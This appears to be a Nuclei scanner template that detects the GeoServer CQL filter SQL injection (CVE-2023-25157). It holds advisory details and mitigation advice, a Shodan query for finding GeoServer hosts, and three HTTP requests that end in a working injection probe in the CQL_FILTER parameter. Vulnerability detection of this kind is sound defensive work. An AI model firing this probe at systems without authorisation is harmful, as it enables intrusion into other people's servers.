id: CVE-2023-25157

info:
  name: GeoServer OGC Filter - SQL Injection
  author: ritikchaddha,DhiyaneshDK,iamnoooob,rootxharsh
  severity: critical
  description: |
    GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. GeoServer includes support for the OGC Filter expression language and the OGC Common Query Language (CQL) as part of the Web Feature Service (WFS) and Web Map Service (WMS) protocols. CQL is also supported through the Web Coverage Service (WCS) protocol for ImageMosaic coverages. Users are advised to upgrade to either version 2.21.4, or version 2.22.2 to resolve this issue. Users unable to upgrade should disable the PostGIS Datastore *encode functions* setting to mitigate ``strEndsWith``, ``strStartsWith`` and ``PropertyIsLike `` misuse and enable the PostGIS DataStore *preparedStatements* setting to mitigate the ``FeatureId`` misuse.
  remediation: |
    Apply the latest security patches or updates provided by the GeoServer project to fix the SQL Injection vulnerability.
  reference:
    - https://twitter.com/parzel2/status/1665726454489915395
    - https://nvd.nist.gov/vuln/detail/CVE-2023-25157
    - https://github.com/win3zz/CVE-2023-25157
    - https://github.com/geoserver/geoserver/security/advisories/GHSA-7g5f-wrx8-5ccf
    - https://github.com/geoserver/geoserver/commit/145a8af798590288d270b240235e89c8f0b62e1d
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-25157
    cwe-id: CWE-89
    epss-score: 0.38863
    epss-percentile: 0.9681
    cpe: cpe:2.3:a:osgeo:geoserver:*:*:*:*:*:*:*:*
  metadata:
    verified: "true"
    max-request: 3
    vendor: osgeo
    product: geoserver
    shodan-query: title:"geoserver"
  tags: GeoServer

flow: http(1) && http(2) && http(3)

http:
  - raw:
      - |
        GET /geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities HTTP/1.1
        Host: {{Hostname}}
    extractors:
      - type: regex
        name: name
        group: 1
        regex:
          - '<FeatureType><Name>(.*?)<\/Name><Title>'
        internal: true
        part: body

  - raw:
      - |
        GET /geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName={{name}}&maxFeatures=50&outputFormat=csv HTTP/1.1
        Host: {{Hostname}}
    extractors:
      - type: regex
        name: column
        group: 1
        regex:
          - 'FID,([aA-zZ_]+),' 
        internal: true
        part: body

  - raw:
      - |
        @timeout: 30s
        GET /geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName={{name}}&CQL_FILTER=strStartswith({{column}},%27%27%27%27)=true HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "SQL SELECT"
      
      - type: word
        part: header
        words:
          - text/xml

# digest: 4a0a00473045022061df3c6b561254b6654e6061aadeb76ba78e1b97f19da7dba5151fa61302315e022100cb23af98fb3d0644c8dedaabc117866047f1d8c6f0a2b2918b956ca1f9922417:922c64590222798bb761d5b6d8e72950
